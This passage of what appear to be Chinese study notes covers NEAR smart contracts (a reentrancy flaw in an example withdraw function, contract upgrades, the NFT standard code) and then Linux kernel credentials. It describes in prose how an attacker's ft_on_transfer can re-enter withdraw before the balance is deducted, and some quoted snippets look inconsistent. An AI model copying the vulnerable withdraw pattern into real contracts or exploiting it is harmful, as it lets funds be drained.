            .with_static_gas(GAS_FOR_SINGLE_CALL)
            .ft_resolve_transfer(amount.into()),
        )
}
<span class="boring">}
</span></code></pre></pre>
<p>乍一看，似乎逻辑没有问题。attacker有足够的FT进行支付，支付成功之后对attacker的FT进行扣除。但是问题在于：</p>
<p>NEAR合约上，Promise是异步执行的单元——也就是在你的<strong>支付操作<code>ft_transfer_call</code><strong>和</strong>扣款回调函数<code>ft_resolve_transfer</code><strong>执行之间，理论上可以存在其他操作——并且<code>ft_transfer_call</code>中会调用</strong>attacker提供</strong>的<code>ft_on_transfer</code>函数，也就是说这个Bug可以被attacker 100%的利用。</p>
<p>那么如果我们是攻击者，要如何编写<code>ft_on_transfer</code>以利用这个Bug，最简单的方式就是重入<code>withdraw</code>函数。执行流程如下图所示（每一个方块是单独的执行单元，高度代表了执行先后顺序，同一高度我也不清楚是什么意思）</p>
<p><img src="Advanced/Blockchain/NEAR/../images/reenter.drawio.svg" alt="reenter.drawio" /></p>
<blockquote>
<p>NEAR的异步模型我需要做进一步的学习。可以做这样的理解：</p>
<p>当我抛出一个Promise之后，程序不会阻塞会接着往下执行，而Promise会在之后的某一个块内运行。</p>
<p>同一个合约内的Promise，不可能同时执行。</p>
</blockquote>
<h2 id="upgrade"><a class="header" href="#upgrade">Upgrade</a></h2>
<p>顾名思义，升级。在NEAR中，一个智能合约分成两个部分，代码(Code)和状态(State，也可以认为是存储的数据)。当我们进行升级的时候，只升级代码就会比较简单。</p>
<p>这个接口是让我们决定代码的Owner的，只有代码的Owner可以改变代码的Owner。他的实现都很简单。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Ownable {
    fn assert_owner(&amp;self) {
        require!(env::predecessor_account_id() == self.get_owner(), &quot;Owner must be predecessor&quot;);
    }
    fn get_owner(&amp;self) -&gt; AccountId;
    fn set_owner(&amp;mut self, owner: AccountId);
}
<span class="boring">}
</span></code></pre></pre>
<p>来看定义的接口。升级分成两个过程，一个是stage，然后是deploy。如果数据也发生了改变，就需要调用migrate。</p>
<blockquote>
<p>TODO 暂时还不清楚为什么要分成两步去完成，是区块链本身的什么限制吗。可能是为了给开发者更高的灵活性。</p>
<p>我怎么觉得他的stagint_duration有点随意。怪怪的。。</p>
</blockquote>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Upgradable {
    fn get_staging_duration(&amp;self) -&gt; WrappedDuration;
    fn stage_code(&amp;mut self, code: Vec&lt;u8&gt;, timestamp: Timestamp);
    fn deploy_code(&amp;mut self) -&gt; Promise;

    /// Implement migration for the next version.
    /// Should be `unimplemented` for a new contract.
    /// TODO: consider adding version of the contract stored in the storage?
    fn migrate(&amp;mut self) {
        unimplemented!();
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>stage_code: 将代码直接存储到合约中。这里的TimeStamp是做什么用呢？由于升级被分成了两个过程，当我们deploy的时候可能还没有stage完成，所以我们在stage的时候传入了一个timestamp，希望depoly一定在这个timestamp之后才去执行。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn stage_code(&amp;mut self, code: Vec&lt;u8&gt;, timestamp: Timestamp) {
    self.assert_owner();
    // 保证timestamp之前，已经stage完成
    require!(
        env::block_timestamp() + self.staging_duration &lt; timestamp,
        &quot;Timestamp must be later than staging duration&quot;
    );
    // Writes directly into storage to avoid serialization penalty by using default struct.
    env::storage_write(b&quot;upgrade&quot;, &amp;code);
    self.staging_timestamp = timestamp;
}
<span class="boring">}
</span></code></pre></pre>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn deploy_code(&amp;mut self) -&gt; Promise {
    // TODO 这里的staging_duration到底是什么语义呢？
    if self.staging_timestamp &lt; env::block_timestamp() {
        env::panic_str(
            format!(
                &quot;Deploy code too early: staging ends on {}&quot;,
                self.staging_timestamp + self.staging_duration
            )
            .as_str(),
        );
    }
    let code = env::storage_read(b&quot;upgrade&quot;)
    .unwrap_or_else(|| env::panic_str(&quot;No upgrade code available&quot;));
    env::storage_remove(b&quot;upgrade&quot;);
    Promise::new(env::current_account_id()).deploy_contract(code)
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="non-fungible-token"><a class="header" href="#non-fungible-token">Non-fungible Token</a></h2>
<p>NFT翻译为非同质化代币。每个代币可以代表一个独特的数码资料，作为虚拟商品所有权的电子认证或凭证。</p>
<h3 id="core-functionality"><a class="header" href="#core-functionality">Core Functionality</a></h3>
<p>感觉看代码更加清楚，先看接口：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait NonFungibleTokenCore {
    fn nft_transfer(
        &amp;mut self,
        receiver_id: AccountId,
        token_id: TokenId,
        approval_id: Option&lt;u64&gt;,
        memo: Option&lt;String&gt;,
    );

    fn nft_transfer_call(
        &amp;mut self,
        receiver_id: AccountId,
        token_id: TokenId,
        approval_id: Option&lt;u64&gt;,
        memo: Option&lt;String&gt;,
        msg: String,
    ) -&gt; PromiseOrValue&lt;bool&gt;;

    fn nft_token(&amp;self, token_id: TokenId) -&gt; Option&lt;Token&gt;;
}

<span class="boring">}
</span></code></pre></pre>
<p>是不是有一种似曾相识的感觉，就接口而言，基本的转账操作和FT很像。这也是应该的，都是转账有什么区别。</p>
<ul>
<li><code>nft_transfer</code>: 将<code>token_id</code>对应的NFT发送给<code>receiver</code>，先不用管<code>appoval_id</code>，后面介绍。</li>
<li><code>nft_transfer_call</code>: 将<code>token_id</code>对应的NFT发送给<code>receiver</code>，并调用函数``nft_on_transfer<code>，函数参数由</code>msg`决定。</li>
<li><code>nft_token</code>: 查询<code>token_id</code>对应的Token信息。</li>
</ul>
<p>来看实现。首先是数据结构，我发现在智能合约上，用空间换时间是一个普遍的操作，总之要杜绝遍历这个操作，不过这也会让代码变得稍微丑陋：一个状态的改变，需要同时更新所有相关的数据。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[derive(BorshDeserialize, BorshSerialize)]
pub struct NonFungibleToken {
    pub owner_id: AccountId,
    pub extra_storage_in_bytes_per_token: StorageUsage,
    pub owner_by_id: TreeMap&lt;TokenId, AccountId&gt;,

    pub token_metadata_by_id: Option&lt;LookupMap&lt;TokenId, TokenMetadata&gt;&gt;,
    pub tokens_per_owner: Option&lt;LookupMap&lt;AccountId, UnorderedSet&lt;TokenId&gt;&gt;&gt;,
    pub approvals_by_id: Option&lt;LookupMap&lt;TokenId, HashMap&lt;AccountId, u64&gt;&gt;&gt;,
    pub next_approval_id_by_id: Option&lt;LookupMap&lt;TokenId, u64&gt;&gt;,
}
<span class="boring">}
</span></code></pre></pre>
<p>我们依然忽略Option的内容。那么和FungibleToken是很相似的，不同在于</p>
<ul>
<li>
<p>NFT不统计发行总量。因为<code>owner_by_id</code>使用的TreeMap获取长度的复杂度是$O(1)$。</p>
<blockquote>
<p>这个TreeMap的实现，和Linux上对进程的管理非常像，一个红黑数+一个数组。</p>
</blockquote>
</li>
<li>
<p>NFT存储了<code>owner_id</code>，TODO 这个还不是很明白，这个标准实现不认为owner就是<code>env::current_account_id</code>吗？</p>
</li>
<li>
<p>NFT存储了TokenID到AccountID的映射。</p>
</li>
</ul>
<h3 id="approval-management"><a class="header" href="#approval-management">Approval Management</a></h3>
<p><a href="https://nomicon.io/Standards/Tokens/NonFungibleToken/ApprovalManagement">NEP-178</a> 要解决的问题，是要更精细的控制交易过程。基本的交易过程，假设在Alice和Bob之间发生，Bob转Token给Alice，是这样的：Bob调用<code>ft_transfer_call(alice)</code>或<code>ft_transfer(alice)</code>。有了Approval Management，Bob就可以将NFT交给第三方（比如Market）进行管理，授权Market转NFT给Alice。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait NonFungibleTokenApproval {
    fn nft_approve(
        &amp;mut self,
        token_id: TokenId,
        account_id: AccountId,
        msg: Option&lt;String&gt;,
    ) -&gt; Option&lt;Promise&gt;;
    fn nft_revoke(&amp;mut self, token_id: TokenId, account_id: AccountId);
    fn nft_revoke_all(&amp;mut self, token_id: TokenId);
    fn nft_is_approved(
        &amp;self,
        token_id: TokenId,
        approved_account_id: AccountId,
        approval_id: Option&lt;u64&gt;,
    ) -&gt; bool;
}
<span class="boring">}
</span></code></pre></pre>
<ul>
<li><code>nft_approve</code>: 允许特定的account转我的特定的token。</li>
<li><code>nft_revoke</code>: 不允许特定的account转我的特定的token。</li>
<li><code>nft_revoke_all</code>: 不允许任何account将我的特定的token转。</li>
<li><code>nft_is_approved</code>: 检查特定的Token是否允许被特定的account转。有一个可选的approval_id参数。</li>
</ul>
<blockquote>
<p>TODO 现在看起来，他人将NFT转给我我是无法拒绝的，但是我要为支付（质押）NEAR吗（不需要）？ 有时是可以拒绝的，通过nft_on_transfer返回false可以拒绝。</p>
<p>TODO 我对approval_id的意义感到不解，他有啥使用场景呢？</p>
</blockquote>
<h3 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h3>
<p>简单的说，Core要求的是TokenID-&gt;AccountID的查询，而Enumeration提供了相反的AccountID-&gt;TokenID的查询。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait NonFungibleTokenEnumeration {
    fn nft_total_supply(&amp;self) -&gt; U128;
    fn nft_tokens(
        &amp;self,
        from_index: Option&lt;U128&gt;, // default: &quot;0&quot;
        limit: Option&lt;u64&gt;,       // default: unlimited (could fail due to gas limit)
    ) -&gt; Vec&lt;Token&gt;;
    fn nft_supply_for_owner(&amp;self, account_id: AccountId) -&gt; U128;
    fn nft_tokens_for_owner(
        &amp;self,
        account_id: AccountId,
        from_index: Option&lt;U128&gt;, // default: &quot;0&quot;
        limit: Option&lt;u64&gt;,       // default: unlimited (could fail due to gas limit)
    ) -&gt; Vec&lt;Token&gt;;
}
<span class="boring">}
</span></code></pre></pre>
<ul>
<li><code>nft_total_supply</code>: 返回NFT的总发行量。</li>
<li><code>nft_tokens</code>: 返回索引在<code>[from_index, from_index+limit)</code>之间的NFT列表。</li>
<li><code>nft_supply_for_owner</code>: 返回account拥有的NFT数量。</li>
<li><code>nft_tokens_for_owner</code>: 返回account拥有的NFT列表。</li>
</ul>
<h3 id="具体实现"><a class="header" href="#具体实现">具体实现</a></h3>
<p>在看实现代码之前，复习一下Rust的知识点。Rust提供了非常函数式的代码风格，让我们在处理Option/Result的时候有着很高的灵活性，也在代码中被大量使用以避免match/if let的过分嵌套。如果对此已经很熟悉，可以跳过</p>
<div class="table-wrapper"><table><thead><tr><th>Option的函数定义</th><th>Option说明</th><th>Result说明</th></tr></thead><tbody>
<tr><td><code>pub fn and_then&lt;U&gt;(self, optb: Option&lt;U&gt;) -&gt; Option&lt;U&gt;</code></td><td>Some(x) =&gt; f(x),<br/>None =&gt; None,</td><td>Ok(t) =&gt; op(t),<br/>Err(e) =&gt; Err(e),</td></tr>
<tr><td><code>pub fn or_else&lt;F&gt;(self, f: F) -&gt; Option&lt;T&gt;</code></td><td>Some(x) =&gt; Some(x),<br />None =&gt; f(),</td><td>Ok(t) =&gt; Ok(t),<br/>Err(e) =&gt; op(e),</td></tr>
<tr><td><code>pub fn map_or&lt;U, F&gt;(self, default: U, f: F) -&gt; U</code> <br />// 我觉得叫做<code>map_or_default</code>更合适</td><td>Some(t) =&gt; f(t),<br />None =&gt; default,</td><td>Ok(t) =&gt; f(t),<br/>Err(_) =&gt; default,</td></tr>
<tr><td><code>pub fn map_or_else&lt;U, D, F&gt;(self, default: D, f: F) -&gt; U</code></td><td>Some(t) =&gt; f(t),<br />None =&gt; default(),</td><td>Ok(t) =&gt; f(t),<br/>Err(e) =&gt; default(e),</td></tr>
<tr><td><code>pub const fn ok_or_else&lt;E&gt;(self, err: E) -&gt; Result&lt;T, E&gt;</code><br /><code>pub const fn ok(self) -&gt; Option&lt;T&gt;</code></td><td>Some(v) =&gt; Ok(v),<br/>None =&gt; Err(err()),</td><td>Ok(x) =&gt; Some(x),<br/>Err(x) =&gt; None,</td></tr>
</tbody></table>
</div>
<ul>
<li>如果方法中带有<code>and</code>，那么是会对Some/Ok进行特殊处理。</li>
<li>如果方法中带有<code>then</code>，那么对Some/Ok的特殊处理是传入一个函数，实现延迟计算的功能。</li>
<li>如果方法中带有<code>or</code>，那么是会对None进行特殊处理。</li>
<li>如果方法中带有<code>else</code>，那么对None的特殊处理是传入一个函数，实现延迟计算的功能。</li>
<li>如果方法中带有<code>ok</code>，是为了在Result和Option之间做相互转换。</li>
</ul>
<h4 id="数据结构"><a class="header" href="#数据结构">数据结构</a></h4>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub struct NonFungibleToken {
    // owner of contract
    pub owner_id: AccountId,

    // The storage size in bytes for each new token
    pub extra_storage_in_bytes_per_token: StorageUsage,

    // always required
    pub owner_by_id: TreeMap&lt;TokenId, AccountId&gt;,

    // required by metadata extension
    pub token_metadata_by_id: Option&lt;LookupMap&lt;TokenId, TokenMetadata&gt;&gt;,

    // required by enumeration extension
    pub tokens_per_owner: Option&lt;LookupMap&lt;AccountId, UnorderedSet&lt;TokenId&gt;&gt;&gt;,

    // required by approval extension
    pub approvals_by_id: Option&lt;LookupMap&lt;TokenId, HashMap&lt;AccountId, u64&gt;&gt;&gt;,
    pub next_approval_id_by_id: Option&lt;LookupMap&lt;TokenId, u64&gt;&gt;,
}
<span class="boring">}
</span></code></pre></pre>
<p>Approval Extension使用的数据结构有点奇怪，来理解一下。最Naive的方式实现Approval Extension的方法，是一个邻接矩阵：<code>approve[TokenID][AccountID] == true</code>代表允许，<code>== false</code>代表不允许。但是显然，这个表的大小是我们无法接受的，用邻接表存很大的稀疏图，本是愚蠢的做法，更何况是在区块链上。</p>
<p>那么，应该使用邻接表——仔细一看，<code>approvals_by_id</code>不就是邻接表吗。</p>
<p>那<code>next_approval_id_by_id</code>是做什么用的呢？这就要考虑一个问题：其实我们的<code>approve</code>也是有<code>id</code>的，虽然我不知道他有什么用，但是我们要保证一个Token对应的ApprovalID各不相同——那么我们可以存一下当前使用过的ApprovalID（递增的话就只用存最后一个，也就是使用的策略），然后每次分配+1就行——没有回收的必要，$2^{64}$是很大的数，一个一个加是不可能溢出的。</p>
<h4 id="core实现"><a class="header" href="#core实现">Core实现</a></h4>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl NonFungibleTokenCore for NonFungibleToken {
    // 和ft_transfer逻辑完全一致
    fn nft_transfer(
        &amp;mut self,
        receiver_id: AccountId,
        token_id: TokenId,
        approval_id: Option&lt;u64&gt;,
        memo: Option&lt;String&gt;,
    ) {
        // 保证本人亲自操作
        assert_one_yocto();
        // 发送者，就是函数调用者
        let sender_id = env::predecessor_account_id();
        // 内部转TOKEN函数
        self.internal_transfer(&amp;sender_id, &amp;receiver_id, &amp;token_id, approval_id, memo);
    }

    // 和ft_transfer_call逻辑完全一致
    fn nft_transfer_call(
        &amp;mut self,
        receiver_id: AccountId,
        token_id: TokenId,
        approval_id: Option&lt;u64&gt;,
        memo: Option&lt;String&gt;,
        msg: String,
    ) -&gt; PromiseOrValue&lt;bool&gt; {
        assert_one_yocto();
        require!(env::prepaid_gas() &gt; GAS_FOR_NFT_TRANSFER_CALL, &quot;More gas is required&quot;);
        let sender_id = env::predecessor_account_id();
        let (old_owner, old_approvals) =
            self.internal_transfer(&amp;sender_id, &amp;receiver_id, &amp;token_id, approval_id, memo);
        // Initiating receiver's call and the callback
        ext_nft_receiver::ext(receiver_id.clone())
            .with_static_gas(env::prepaid_gas() - GAS_FOR_NFT_TRANSFER_CALL)
            // 调用receiver的nft_on_transfer函数，收款函数
            .nft_on_transfer(sender_id, old_owner.clone(), token_id.clone(), msg)
            .then(
                ext_nft_resolver::ext(env::current_account_id())
                    .with_static_gas(GAS_FOR_RESOLVE_TRANSFER)
                    // 调用回调函数
                    .nft_resolve_transfer(old_owner, receiver_id, token_id, old_approvals),
            )
            .into()
    }

    fn nft_token(&amp;self, token_id: TokenId) -&gt; Option&lt;Token&gt; {
        let owner_id = self.owner_by_id.get(&amp;token_id)?;
        Some(Token { token_id, owner_id, metadata, approved_account_ids })
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>这一块和FT的实现非常相似。区别主要还是要看内部的转账<code>internal_transfer</code>的实现和回调函数<code>nft_resolve_transfer</code>的实现。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub fn internal_transfer(
    &amp;mut self,
    sender_id: &amp;AccountId,
    receiver_id: &amp;AccountId,
    #[allow(clippy::ptr_arg)] token_id: &amp;TokenId,
    approval_id: Option&lt;u64&gt;,
    memo: Option&lt;String&gt;,
) -&gt; (AccountId, Option&lt;HashMap&lt;AccountId, u64&gt;&gt;) {
    // 获取Token的Owner，如果没有的话直接Panic
    let owner_id = self.owner_by_id.get(token_id).unwrap_or_else(|| env::panic_str(&quot;Token not found&quot;));

    // 从approvals_by_id中删除token的所有规则，因为token被转账了，之前的规则应该取消了
    let approved_account_ids = self.approvals_by_id.as_mut().and_then(|by_id| by_id.remove(token_id));

    // 检查sender_id是不是真的有权限去转账token
    // 如果sender_id != owner_id
    let sender_id = if sender_id != &amp;owner_id {
        // 如果没有使用approval extension，并且sender_id != owner_id，不允许转账
        let app_acc_ids = approved_account_ids.as_ref().unwrap_or_else(|| env::panic_str(&quot;Unauthorized&quot;));

        // 对于使用了approval extension的情况，我们要判断sender_id是否是否在token授权交易的列表中
        let actual_approval_id = app_acc_ids.get(sender_id);
        // 如果不在，不允许转账
        if actual_approval_id.is_none() {
            env::panic_str(&quot;Sender not approved&quot;);
        }

        // TODO 检查提供的approval_id是否与查询到的approval_id相同，要求一定相同或者不提供approval_id
        require!(
            approval_id.is_none() || actual_approval_id == approval_id.as_ref(),
            format!(
                &quot;The actual approval_id {:?} is different from the given approval_id {:?}&quot;,
                actual_approval_id, approval_id
            )
        );
        Some(sender_id)
    } else {
        None
    };

    // 如果receiver_id和owner_id一样的话就不需要转了
    require!(&amp;owner_id != receiver_id, &quot;Current and next owner must differ&quot;);

    // 将token的owner变成receiver，其实真正的转账逻辑就这一句话
    self.owner_by_id.insert(token_id, receiver_id);

    // 如果使用了Enumeration standard ，还要更新一下统计数据
    if let Some(tokens_per_owner) = &amp;mut self.tokens_per_owner {
        // owner_tokens should always exist, so call `unwrap` without guard
        let mut owner_tokens = tokens_per_owner.get(&amp;owner_id).unwrap_or_else(|| {
            env::panic_str(&quot;Unable to access tokens per owner in unguarded call.&quot;)
        });
        // 从owner拥有的token列表中移除此token
        owner_tokens.remove(token_id);
        if owner_tokens.is_empty() {
            tokens_per_owner.remove(&amp;owner_id);
        } else {
            tokens_per_owner.insert(&amp;owner_id, &amp;owner_tokens);
        }
        // 从receiver拥有的token列表中添加此token
        let mut receiver_tokens = tokens_per_owner.get(receiver_id).unwrap_or_else(|| {
            UnorderedSet::new(StorageKey::TokensPerOwner {
                account_hash: env::sha256(receiver_id.as_bytes()),
            })
        });
        receiver_tokens.insert(token_id);
        tokens_per_owner.insert(receiver_id, &amp;receiver_tokens);
    };
    

    // 打个日志
    NonFungibleToken::emit_transfer(&amp;owner_id, receiver_id, token_id, sender_id, memo);

    // 返回 previous owner &amp; approvals 信息，供回调函数使用
    (owner_id, approved_account_ids)
}
<span class="boring">}
</span></code></pre></pre>
<p>回调函数实现</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn nft_resolve_transfer(
    &amp;mut self,
    previous_owner_id: AccountId,
    receiver_id: AccountId,
    token_id: TokenId,
    approved_account_ids: Option&lt;HashMap&lt;AccountId, u64&gt;&gt;,
) -&gt; bool {
    // 判断是否要将NFT返回给发送者previous_owner_id
    let must_revert = match env::promise_result(0) {
        PromiseResult::NotReady =&gt; env::abort(),
        PromiseResult::Successful(value) =&gt; {
            if let Ok(yes_or_no) = near_sdk::serde_json::from_slice::&lt;bool&gt;(&amp;value) {
                yes_or_no
            } else {
                true
            }
        }
        PromiseResult::Failed =&gt; true,
    };

    // 如果不需要返回NFT，就可以直接退出了
    if !must_revert {
        return true;
    }

    // OTHERWISE, try to set owner back to previous_owner_id and restore approved_account_ids
	// 否则，我们不仅要吧NFT回交给发送者，还要恢复我们之前修改的数据结构
    
    // Check that receiver didn't already transfer it away or burn it.
    if let Some(current_owner) = self.owner_by_id.get(&amp;token_id) {
        if current_owner != receiver_id {
            // The token is not owned by the receiver anymore. Can't return it.
            return true;
        }
    } else {
        // The token was burned and doesn't exist anymore.
        // Refund storage cost for storing approvals to original owner and return early.
        if let Some(approved_account_ids) = approved_account_ids {
            refund_approved_account_ids(previous_owner_id, &amp;approved_account_ids);
        }
        return true;
    };

    self.internal_transfer_unguarded(&amp;token_id, &amp;receiver_id, &amp;previous_owner_id);

    // If using Approval Management extension,
    // 1. revert any approvals receiver already set, refunding storage costs
    // 2. reset approvals to what previous owner had set before call to nft_transfer_call
    if let Some(by_id) = &amp;mut self.approvals_by_id {
        if let Some(receiver_approvals) = by_id.get(&amp;token_id) {
            refund_approved_account_ids(receiver_id.clone(), &amp;receiver_approvals);
        }
        if let Some(previous_owner_approvals) = approved_account_ids {
            by_id.insert(&amp;token_id, &amp;previous_owner_approvals);
        }
    }
    NonFungibleToken::emit_transfer(&amp;receiver_id, &amp;previous_owner_id, &amp;token_id, None, None);
    false
}
<span class="boring">}
</span></code></pre></pre>
<p>Mint实现</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span> pub fn internal_mint_with_refund(
        &amp;mut self,
        token_id: TokenId,
        token_owner_id: AccountId,
        token_metadata: Option&lt;TokenMetadata&gt;,
        refund_id: Option&lt;AccountId&gt;,
    ) -&gt; Token {
        // Remember current storage usage if refund_id is Some
        let initial_storage_usage = refund_id.map(|account_id| (account_id, env::storage_usage()));

        if self.token_metadata_by_id.is_some() &amp;&amp; token_metadata.is_none() {
            env::panic_str(&quot;Must provide metadata&quot;);
        }
        if self.owner_by_id.get(&amp;token_id).is_some() {
            env::panic_str(&quot;token_id must be unique&quot;);
        }

        let owner_id: AccountId = token_owner_id;

        // Core behavior: every token must have an owner
        self.owner_by_id.insert(&amp;token_id, &amp;owner_id);

        // Metadata extension: Save metadata, keep variable around to return later.
        // Note that check above already panicked if metadata extension in use but no metadata
        // provided to call.
        self.token_metadata_by_id
            .as_mut()
            .and_then(|by_id| by_id.insert(&amp;token_id, token_metadata.as_ref().unwrap()));

        // Enumeration extension: Record tokens_per_owner for use with enumeration view methods.
        if let Some(tokens_per_owner) = &amp;mut self.tokens_per_owner {
            let mut token_ids = tokens_per_owner.get(&amp;owner_id).unwrap_or_else(|| {
                UnorderedSet::new(StorageKey::TokensPerOwner {
                    account_hash: env::sha256(owner_id.as_bytes()),
                })
            });
            token_ids.insert(&amp;token_id);
            tokens_per_owner.insert(&amp;owner_id, &amp;token_ids);
        }

        // Approval Management extension: return empty HashMap as part of Token
        let approved_account_ids =
            if self.approvals_by_id.is_some() { Some(HashMap::new()) } else { None };

        if let Some((id, storage_usage)) = initial_storage_usage {
            refund_deposit_to_account(env::storage_usage() - storage_usage, id)
        }

        // Return any extra attached deposit not used for storage

        Token { token_id, owner_id, metadata: token_metadata, approved_account_ids }
    }
<span class="boring">}
</span></code></pre></pre>
<h4 id="approval实现"><a class="header" href="#approval实现">Approval实现</a></h4>
<p>源代码里面的注释非常详细。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn nft_approve(
    &amp;mut self,
    token_id: TokenId,
    account_id: AccountId,
    msg: Option&lt;String&gt;,
) -&gt; Option&lt;Promise&gt; {
    // 授权必须是本人操作
    assert_at_least_one_yocto();
    // 首先要开启approvals，获取数据结构
    let approvals_by_id = self
    	.approvals_by_id
    	.as_mut()
    	.unwrap_or_else(|| env::panic_str(&quot;NFT does not support Approval Management&quot;));

    // 必须是Token的owner才可以给token授权
    let owner_id = expect_token_found(self.owner_by_id.get(&amp;token_id));

    require!(env::predecessor_account_id() == owner_id, &quot;Predecessor must be token owner.&quot;);

    let next_approval_id_by_id = expect_approval(self.next_approval_id_by_id.as_mut());
    // update HashMap of approvals for this token
    let approved_account_ids = &amp;mut approvals_by_id.get(&amp;token_id).unwrap_or_default();
    // 生成一个approval_id
    let approval_id: u64 = next_approval_id_by_id.get(&amp;token_id).unwrap_or(1u64);
    let old_approval_id = approved_account_ids.insert(account_id.clone(), approval_id);

    // save updated approvals HashMap to contract's LookupMap
    approvals_by_id.insert(&amp;token_id, approved_account_ids);

    // increment next_approval_id for this token
    next_approval_id_by_id.insert(&amp;token_id, &amp;(approval_id + 1));

    // If this approval replaced existing for same account, no storage was used.
    // Otherwise, require that enough deposit was attached to pay for storage, and refund
    // excess.
    let storage_used = if old_approval_id.is_none() { bytes_for_approved_account_id(&amp;account_id) } else { 0 };
    refund_deposit(storage_used);

    // if given `msg`, schedule call to `nft_on_approve` and return it. Else, return None.
    msg.map(|msg| {
        ext_nft_approval_receiver::ext(account_id)
        .with_static_gas(env::prepaid_gas() - GAS_FOR_NFT_APPROVE)
        .nft_on_approve(token_id, owner_id, approval_id, msg)
    })
}
<span class="boring">}
</span></code></pre></pre>
<h4 id="enumeration实现"><a class="header" href="#enumeration实现">Enumeration实现</a></h4>
<div style="break-before: page; page-break-before: always;"></div><p>密码学，共识协议，分布式，</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="linux"><a class="header" href="#linux">Linux</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux-1"><a class="header" href="#linux-1">Linux</a></h1>
<p>从大二上，一个萌新上操作系统课，到现在的笔记。</p>
<p>关于如何阅读linux源码，比较赞同的两篇文章</p>
<ul>
<li>https://www.zhihu.com/question/439569498/answer/2242340127</li>
<li>https://mp.weixin.qq.com/s/U3Ifpfm4nUnIHJaAYXI1gw</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="credential"><a class="header" href="#credential">Credential</a></h1>
<p>credential的中文意思是“凭证”。下文是<a href="https://www.kernel.org/doc/html/latest/security/credentials.html">这篇文档</a>的中文翻译。我个人的翻译习惯是不翻译专有名词，或者给出中文解释之后保持原来的专有名词。我们常说的&quot;root&quot;权限，其实就是在Credential范畴的概念。</p>
<p>Linux的权限管理机制</p>
<ul>
<li>DAC</li>
<li>Capabilities</li>
<li>LSM, 提供了一些列的hook，具体的实现比如SELinux, AppArmor</li>
</ul>
<h2 id="overview"><a class="header" href="#overview">Overview</a></h2>
<p>当一个Object对另外一个Object进行操作的时候，Linux会进行安全检查。安全检查可以分成下面几个部分</p>
<ol>
<li>
<p>Objects</p>
<p>Objects是系统中可以直接被用户空间的程序控制的东西。Linux有很多objects，包括</p>
<ul>
<li>Tasks(进程)</li>
<li>Files/inode(打开的文件/文件系统中的文件)</li>
<li>Sockets</li>
<li>Message queues</li>
<li>Shared memory segments</li>
<li>Semaphores(信号)</li>
<li>Keys</li>
</ul>
<p>所有object的description中，有一部分内容是一组credential。具体是什么credential取决于object的类型。</p>
</li>
<li>
<p>Object ownership</p>
<p>在object的credential中，有一部分是用来表明ownership of that object。这被用在资源计数和限制。</p>
<p>在标准的UNIX文件系统中，inode的uid就是用来表示ownership的。</p>
</li>
<li>
<p>The objective context</p>
<p>在object的credential中，还有一部分是用来表明‘objective context’ of that object。他可能和表示ownership的credential一样，也可能不一样。在标准的UNIX文件系统中，inode的uid和gid就是用来表示objective context的。</p>
</li>
<li>
<p>Subjects</p>
<p>Subject是一个正在对其他object进行操作的object。</p>
<p>大部分的object是不会对其他的object进行操作的。Process/Task是明显的例外：他们会访问和操作资源。</p>
<p>除了Task，其他的object在某些情况下也可能会变成subject。比如，一个打开的文件可能会使用task通过<code>fcntl</code>给它的UID和EUID，来发送SIGIO给一个task。在这种情况下，打开的文件同时也是subjective context。</p>
</li>
<li>
<p>The subjective context</p>
<p>一个subject有额外的对credentials的解释。subjective context用于subject进行操作时执行的安全检查的一部分。</p>
<p>一个Linux task有FSUID, FSGID和supplementary group list当他正在操作一个文件，这和他真正的UID和GID是完全区分开的。</p>
</li>
<li>
<p>Actions</p>
<p>在Linux中，subject可以对object进行很多操作，具体有什么操作取决于subject和object本身。</p>
<p>操作包括reading/writing/creating/deleting files; forking/signalling/tracing tasks。</p>
</li>
<li>
<p>Rules, access control lists and security calculations</p>
</li>
</ol>
<h2 id="types-of-credentials"><a class="header" href="#types-of-credentials">Types of credentials</a></h2>
<p>Linux kernel支持下面这些类型的credentials</p>
<ol>
<li>
<p>传统的UNIX credentials</p>
<ul>
<li>Real User ID</li>
<li>Real Group ID</li>
</ul>
<p>UID和GID被绝大多数的object拥有，即使是现场造也会给他造出来。</p>
<ul>
<li>Effective, Saved and FS User ID</li>
<li>Effective, Saved and FS Group ID</li>
<li>Supplementary groups</li>
</ul>
<p>这些是Task特有的credentials。通常EUID/EGID/GROUPS被用于subjective context，而UID/GID被用具objective，不过对task来说不总是这样的。</p>
</li>
<li>
<p>Capabilities</p>
<ul>
<li>Set of permitted capabilities</li>
<li>Set of inheritable capabilities</li>
<li>Set of effective capabilities</li>
<li>Capability bounding set</li>
</ul>
